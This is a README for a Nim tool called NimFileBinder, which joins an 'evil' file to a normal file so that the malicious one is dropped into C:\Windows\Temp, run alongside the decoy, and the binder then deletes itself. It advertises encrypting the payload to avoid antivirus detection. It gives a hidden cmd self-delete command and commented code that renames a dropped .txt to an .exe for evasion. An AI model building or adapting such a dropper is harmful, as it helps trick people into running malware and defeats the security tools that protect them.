#### 作者知识星球
<img src="https://images-1258433570.cos.ap-beijing.myqcloud.com/images/20210912184747.png" width="400"> 


# NimFileBinder
​	A Builder for Binding Evil File and Normal File with auto release

​	written by Nim(Just a routh tool of learning Nim)

<img src="https://images-1258433570.cos.ap-beijing.myqcloud.com/images/20210807221105.png" alt="image-20210807221056924" style="zoom:67%;" />

### Start

you should install the mingw , ex in Mac:

```
brew install mingw
```

![image-20210807221034845](https://images-1258433570.cos.ap-beijing.myqcloud.com/images/20210807221036.png)

It will release your malicious files to C:\Windows\Temp\, and then self-delete and run normal files and malicious files

### Feature

- Reduce the risk of being detected by anti-virus
- “hardcode” the file into code with encrypt
- self delete

### Others

**1. There are still many imperfections in the code, which need to be modified when used:**

​	Change the name of the output executable program, of course, you need to change the name of the automatic deletion:

```
ShellExecute(0, "open", "cmd.exe", "/c del *CustomFileName*", NULL, SW_HIDE)
```

​	Of course you can also leave out this parameters,

​	I am a lazy guy... sorry my bad :)



**2. In lines 116-117, the code I have commented, you can enable it and modify the corresponding name, which may be useful for evasion anti-virus** 

```
#copyFile("C:\\Windows\\Temp\\calc.txt", "C:\\Windows\\Temp\\calc.exe")
#removeFile("C:\\Windows\\Temp\\calc.txt")
```

​	Release a txt file first, then copy to PE

